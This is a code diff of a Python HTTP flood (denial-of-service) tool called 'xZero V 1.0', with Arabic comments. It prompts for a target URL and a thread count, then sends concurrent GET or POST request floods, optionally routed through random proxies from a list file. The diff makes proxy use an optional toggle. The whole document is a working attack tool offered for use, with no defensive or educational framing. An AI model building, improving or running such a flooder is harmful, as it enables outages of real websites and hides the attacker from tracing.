@@ -15,10 +15,9 @@ print(f'''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣛⡛⠋⠉⠁⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RED} xZero V 1.0
 
 {Style.RESET_ALL}
@@ -54,12 +53,12 @@ async def http_attack(target, proxy=None, method="GET", headers=None, success_co
                 failure_counter[0] += 1  # زيادة العداد للفشل
             await asyncio.sleep(0.1)  # تأخير بين الطلبات لتقليل الضغط
 
-async def main(url, threads, proxies, method):
+async def main(url, threads, proxies, method, use_proxies):
     success_counter = [0]  # عداد الطلبات الناجحة
     failure_counter = [0]  # عداد الطلبات الفاشلة
     tasks = []
     for _ in range(threads):
-        proxy = random.choice(proxies)  # اختيار بروكسي عشوائي
+        proxy = random.choice(proxies) if use_proxies else None  # اختيار بروكسي عشوائي إذا كان مفعلًا
         tasks.append(asyncio.create_task(http_attack(url, proxy, method, success_counter, failure_counter)))
     await asyncio.gather(*tasks)
 
@@ -76,7 +75,7 @@ def load_proxies(file_path):
 if __name__ == "__main__":
     url = input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Target]
 {Fore.CYAN}└──╼ ~ ❯ ''')
-    
+
     try:
         threads = int(input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Threads]
 {Fore.CYAN}└──╼ ~ ❯ '''))
@@ -87,7 +86,10 @@ if __name__ == "__main__":
         exit("Threads count must be greater than 0!")
 
     proxies = load_proxies("proxy_list.txt")
-    if not proxies:
+    use_proxies = input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Use Proxies? (y/n)]
+{Fore.CYAN}└──╼ ~ ❯ ''').strip().lower() == 'y'
+    
+    if use_proxies and not proxies:
         exit("No proxies found in the file!")
 
     # تحديد نوع الطلب
@@ -96,4 +98,4 @@ if __name__ == "__main__":
     if method not in ["GET", "POST"]:
         exit("Invalid method! Please choose GET or POST.")
 
-    asyncio.run(main(url, threads, proxies, method))
+    asyncio.run(main(url, threads, proxies, method, use_proxies))
